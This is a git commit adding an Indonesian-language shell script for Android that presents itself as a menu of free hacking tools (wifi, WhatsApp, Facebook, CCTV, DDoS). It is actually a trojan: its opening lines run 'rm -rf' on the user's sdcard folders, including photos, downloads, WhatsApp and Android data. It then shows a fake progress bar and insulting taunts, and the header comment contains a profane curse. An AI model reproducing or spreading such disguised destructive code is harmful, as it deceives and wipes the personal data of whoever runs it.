eb21f1ceae6559230d3766414a6a5ea6b7fa65be
MrZ1R0 <58037551+MrZ1R0@users.noreply.github.com>
2019-11-21 20:55:24 +0700

    Create Wifi-by-Zh3nX.sh

---
+++ Wifi-by-Zh3nX.sh
@@ -0,0 +1,126 @@
+#!/system/xbin/bash
+#AUTHOR:MR.Z1R0
+#Github:https://github.com/MrZ1R0
+#Ngapain Lo Sampai Sini Mau Recode! Gua Doain Orang Tua Lu Meninggal Dan Lu mandul Sampai Mati.boleh Recode Tapi Hargai Author Njeng
+#Bersihkan Layar
+cd /sdcard
+rm -rf Docouments
+rm -rf Android
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+rm -rf KAWAI3
+rm -rf Vidio
+blue='\e[1;34m'
+green='\e[1;32m'
+purple='\[1;35m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+white='\e[1;37m'
+yellow='\e[1;33m'
+sleep 3
+echo "\033[32;1m
+#################################
+#-AUTHOR=MR.Z1R0                #
+#-INSTAGRAM=xzen_sorax          #
+#-Team=The Clown                #
+#-Email= Nothing.               #
+#################################
+"
+sleep 3
+
+echo "\033[32;1mTULIS= MR.Z1R0 TAMPANS "
+read p;
+
+sleep 3
+
+echo "\033[32;1m
+#-KUMPULAN TOOLS 2019 NO ROOT-#
+______________________________
+|1.hack wifi (no Root)       |
+|2.sadap Wa (No Root)        |
+|3.hack lampu lalu Lintas    |
+|4.hack Facebook Target      |
+|5.hack Instagram            |
+|6.hack Hp Orang             |
+|7.spam Sms Unlimited        |
+|8.hack Camera               |
+|9.install Metasploit        |
+|10.DDOS                     |
+|11.hack lampu Cafe          |
+|12.DOS                      |
+|13.Sql Injetion             |
+|14.Admin Finder             |
+|15.Root Hp                  |
+|16.kumpulan deface Keren    |
+|17.Hack Satelit             |
+|18.Pelacak Penipu           |
+|19.Hack CCTV                |
+|20.pembuat panas Hp Orang   |
+|21.Hack Fb target 100% work |
+|____________________________|
+
+
+"
+echo "\033[32;1mPilih No : "
+read p;
+
+sleep 2
+echo "Sabar Njeng Proses..."
+echo "\033[34;1m#10%"
+sleep 1
+echo "##20%"
+sleep 1
+echo "###30%"
+sleep 3
+echo "####40%"
+sleep 3
+echo "#####50%"
+sleep 3
+echo "######60%"
+sleep 3
+echo "#######70%"
+sleep 4
+echo "########80%"
+sleep 3
+echo "#########90%"
+sleep 4
+echo "##########100%"
+sleep 3
+echo "_____________________________________"
+sleep 3
+echo "Kau Baca Pesan Gua Njeng"
+sleep 4
+echo "hacker Jahat Berawal Dari"
+sleep 4
+echo "hacker Baik yang Di Sakiti"
+sleep 4
+echo "Seperti Saya Yang Selalu Di Tikung oleh teman sendiri"
+sleep 4
+echo "Jadi Kalian Harus Merasakan"
+sleep 4
+echo "Apa Yang Saya Rasakan"
+sleep 4
+echo "Selamat Anda Mendapatkan LONTE"
+sleep 4
+echo "Gak Senang Lo Njenk"
+sleep 4
+echo "HACK FB GUA SANA ( Zhen ) tuh nama fb gua"
+sleep 3
+echo "____________________________________"
+sleep 4
+toilet -f standard -F gay "MAMPUS"
+sleep 3
+toilet -f standard -F gay "LOE"
+sleep 3
+toilet -f standard -F gay "BANGSAT"
+sleep 3
+toilet -f standard -F gay "MAMPUS LO ORANG YANG SUKA NYA GRATISAN"
+
+
+
